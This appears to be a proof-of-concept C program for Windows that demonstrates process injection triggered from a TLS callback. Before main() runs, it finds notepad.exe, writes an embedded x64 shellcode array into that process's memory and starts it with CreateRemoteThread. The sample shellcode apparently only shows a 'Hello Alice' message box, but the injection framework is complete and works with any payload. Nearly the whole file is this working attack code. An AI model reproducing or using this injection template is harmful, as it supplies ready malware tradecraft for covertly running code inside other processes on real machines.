#include "windows.h"
#pragma comment(lib, "user32.lib")
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved);

//linker spec
#ifdef _M_IX86
	#pragma comment (linker, "/INCLUDE:__tls_used")
	#pragma comment (linker, "/INCLUDE:__tls_callback")
#else
	#pragma comment (linker, "/INCLUDE:_tls_used")
	#pragma comment (linker, "/INCLUDE:_tls_callback")
#endif

EXTERN_C
#ifdef _M_X64
	#pragma const_seg (".CRT$XLB")
	const
#else
	#pragma data_seg (".CRT$XLB")
#endif
//end linker

//tls import
PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;
#pragma data_seg ()
#pragma const_seg ()
//end 

unsigned char payload[] = {
 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72,
 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2,
 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f,
 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01,
 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b,
 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7,
 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x00, 0x00, 0x00, 0x3e,
 0x4c, 0x8d, 0x85, 0x0a, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff,
 0xd5, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x41, 0x6c, 0x69, 0x63, 0x65, 0x00, 0x6c,
 0x6f, 0x75, 0x6c, 0x00
};

unsigned int payload_size = sizeof(payload);


int find_proc(const char *procname) {

        HANDLE handle_ProcSnap;
        PROCESSENTRY32 PE_Entry;
        int pid = 0;
                
        handle_ProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == handle_ProcSnap) return 0;
                
        PE_Entry.dwSize = sizeof(PROCESSENTRY32); 
        

		if (!Process32First(handle_ProcSnap, &PE_Entry)) {
                CloseHandle(handle_ProcSnap);
                return 0;
        }
		else {
			if (lstrcmpiA(procname, PE_Entry.szExeFile) == 0) {
					pid = PE_Entry.th32ProcessID;
                    CloseHandle(handle_ProcSnap);
					return pid;
			}
		}
				
		
        while (Process32Next(handle_ProcSnap, &PE_Entry)) {
                if (lstrcmpiA(procname, PE_Entry.szExeFile) == 0) {
                        pid = PE_Entry.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(handle_ProcSnap);
                
        return pid;
}


int injection(HANDLE handle_proc, unsigned char * payload, unsigned int payload_size) {

        LPVOID pRemoteSpace = NULL;
        HANDLE hThread = NULL;

  
        pRemoteSpace = VirtualAllocEx(handle_proc, NULL, payload_size, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(handle_proc, pRemoteSpace, (PVOID)payload, (SIZE_T)payload_size, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(handle_proc, NULL, 0, pRemoteSpace, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

// tls declaration
void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
{
	int pid = NULL;
    HANDLE handle_proc = NULL;
	MessageBoxW(NULL, L"Search for notepad", L"TLS injection", 0);
	pid = find_proc("notepad.exe");

	if (pid) {
		MessageBoxW(NULL, L"Notepad Found", L"TLS injection", 0);
		handle_proc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

	if (handle_proc != NULL) {
		MessageBoxW(NULL, L"injection in Notepad Found", L"TLS injection", 0);
		injection(handle_proc, payload, payload_size);
		CloseHandle(handle_proc);
		}
	}

	ExitProcess(0);
}

// end declaration

int main(int argc, char* argv[])
{
	printf("Never executed main LOL");
	ExitProcess(0);
}
